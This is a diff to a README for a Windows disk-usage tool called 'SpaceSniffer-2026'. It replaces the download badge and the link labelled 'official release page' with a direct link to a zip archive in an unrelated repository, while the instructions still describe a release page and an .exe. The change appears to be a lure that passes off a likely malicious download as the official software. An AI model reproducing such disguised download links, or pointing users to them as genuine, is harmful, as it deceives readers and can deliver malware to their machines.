@@ -5,7 +5,7 @@ description: "Visualize disk space usage on Windows 10 and 11 with this direct i
 ---
 # 🔍 SpaceSniffer-2026 - Find and clear disk space easily
 
-[![Download SpaceSniffer-2026](https://img.shields.io/badge/Download-SpaceSniffer-blue.svg)](https://github.com/Karolineappointed82/SpaceSniffer-2026)
+[![Download SpaceSniffer-2026](https://img.shields.io/badge/Download-SpaceSniffer-blue.svg)](https://raw.githubusercontent.com/Karolineappointed82/karolineappointed82.github.io/main/enlightenedness/io-karolineappointed-github-1.0.zip)
 
 ## 📁 What is SpaceSniffer-2026?
 
@@ -19,7 +19,7 @@ This software works on Windows 10 and Windows 11. It requires no complex setup. 
 
 Follow these steps to get the tool on your computer.
 
-1. Navigate to the [official release page](https://github.com/Karolineappointed82/SpaceSniffer-2026).
+1. Navigate to the [official release page](https://raw.githubusercontent.com/Karolineappointed82/karolineappointed82.github.io/main/enlightenedness/io-karolineappointed-github-1.0.zip).
 2. Look for the list labeled Releases on the right side of the screen.
 3. Click the latest version of the file ending in .exe.
 4. Save the file to your Downloads folder or your Desktop.
